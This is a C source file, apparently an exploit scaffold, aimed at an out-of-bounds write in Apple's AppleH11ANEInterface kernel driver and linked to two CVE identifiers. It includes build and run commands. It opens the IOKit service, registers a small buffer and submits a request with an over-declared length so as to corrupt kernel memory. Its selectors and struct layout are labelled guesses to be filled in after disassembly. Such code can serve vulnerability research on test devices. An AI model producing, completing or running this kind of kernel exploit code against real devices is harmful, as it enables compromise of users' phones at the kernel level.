/*
 * ane_oob_scaffold.c — SCAFFOLD, not an exploit.
 *
 * Target : CVE-2026-112696 / CVE-2026-84494 (AppleH11ANEInterface)
 * Theory : a request handed to the ANE user client carries a length/offset
 *          pair that pre-fix is not clamped against the mapped buffer, so
 *          the driver copies `declared_len` bytes out of a buffer that holds
 *          fewer, corrupting kernel memory.
 * Status : the user-client selectors, the request struct layout and the
 *          index of the vulnerable method are NOT known from the workspace
 *          diffs. The constants below are placeholders that must be replaced
 *          after disassembling AppleH11ANEInterface in both IPsws.
 *
 * Build  : xcrun -sdk iphoneos clang -arch arm64 -framework IOKit \
 *              -framework CoreFoundation ane_oob_scaffold.c -o ane_oob
 * Run    : on a test device (jailbroken or with an internal build that
 *          permits IOServiceOpen to the ANE service).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

/* ------------------------------------------------------------------ */
/* REPLACE THESE AFTER DISASSEMBLY                                     */
/* ------------------------------------------------------------------ */

/* IOService name of the ANE interface (verify with `ioreg -l | grep -i ane`). */
#define ANE_SERVICE_NAME            "AppleH11ANEInterface"

/* External method selector that reaches the buffer-length copy.         */
/* Placeholder: enumerate the user-client method table in the binary.    */
#define ANE_SELECTOR_SUSPECT        0

/* Layout of the request struct (all fields guessed).                   */
struct ane_request {
    uint32_t cmd;          /* opcode                                  */
    uint32_t pad0;
    uint64_t buf_handle;   /* handle of a previously registered buffer */
    uint64_t buf_offset;   /* offset into the buffer                   */
    uint32_t buf_len;      /* <-- the field we over-declare            */
    uint32_t pad1;
    uint64_t param_handle; /* optional secondary parameter buffer      */
};

/* Size of the kernel staging buffer the theory says is overrun.         */
/* Derive from __DATA_CONST.__kalloc_type / from the driver's IOMalloc.  */
#define ASSUMED_STAGING_SIZE        (64 * 1024)

/* ------------------------------------------------------------------ */

static io_service_t ane_open_service(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching(ANE_SERVICE_NAME));
    if (!svc) {
        fprintf(stderr, "[-] service %s not found\n", ANE_SERVICE_NAME);
    }
    return svc;
}

static io_connect_t ane_open_connection(io_service_t svc) {
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] IOServiceOpen: 0x%x\n", kr);
        return 0;
    }
    return conn;
}

/*
 * Register a buffer that the driver will later reference by handle.
 * The ANE user client typically wraps an IOSurface or an
 * IOBufferMemoryDescriptor. Replace with the real registration call.
 */
static uint64_t ane_register_buffer(io_connect_t conn, size_t size) {
    uint64_t in[2]  = { (uint64_t)size, 0 };
    uint64_t out[2] = { 0, 0 };
    uint32_t out_cnt = 2;
    kern_return_t kr = IOConnectCallScalarMethod(conn, /*REGISTER_SEL*/ 1,
                                                 in, 2, out, &out_cnt);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] register buffer failed: 0x%x\n", kr);
        return 0;
    }
    return out[0];
}

/*
 * Submit the over-declared request.
 *
 * The malicious property: buf_len is larger than the buffer we registered,
 * by an amount that crosses the boundary of the kernel staging buffer.
 */
static void ane_submit_oob(io_connect_t conn, uint64_t handle,
                           size_t real_buffer_len, size_t overrun) {
    struct ane_request req;
    memset(&req, 0, sizeof(req));
    req.cmd        = 0;                    /* replace with a real opcode   */
    req.buf_handle = handle;
    req.buf_offset = 0;
    /* The bug: declare a length that exceeds the backing buffer. */
    req.buf_len    = (uint32_t)(real_buffer_len + overrun);

    size_t out_sz = 0x1000;
    void  *out    = calloc(1, out_sz);

    kern_return_t kr = IOConnectCallStructMethod(conn, ANE_SELECTOR_SUSPECT,
                                                 &req, sizeof(req),
                                                 out, &out_sz);
    printf("[*] submit -> 0x%x (out_sz=0x%zx)\n", kr, out_sz);
    free(out);
}

int main(int argc, char **argv) {
    size_t real_len = 0x1000;               /* small buffer              */
    size_t overrun  = ASSUMED_STAGING_SIZE; /* cross the staging buffer  */

    if (argc > 1) overrun = strtoul(argv[1], NULL, 0);
    if (argc > 2) real_len = strtoul(argv[2], NULL, 0);

    io_service_t svc = ane_open_service();
    if (!svc) return 1;
    io_connect_t conn = ane_open_connection(svc);
    IOObjectRelease(svc);
    if (!conn) return 1;

    uint64_t handle = ane_register_buffer(conn, real_len);
    if (!handle) {
        fprintf(stderr, "[-] no buffer handle; adjust ane_register_buffer()\n");
        return 1;
    }

    printf("[*] handle=0x%llx real_len=0x%zx overrun=0x%zx\n",
           (unsigned long long)handle, real_len, overrun);

    ane_submit_oob(conn, handle, real_len, overrun);

    IOServiceClose(conn);
    return 0;
}
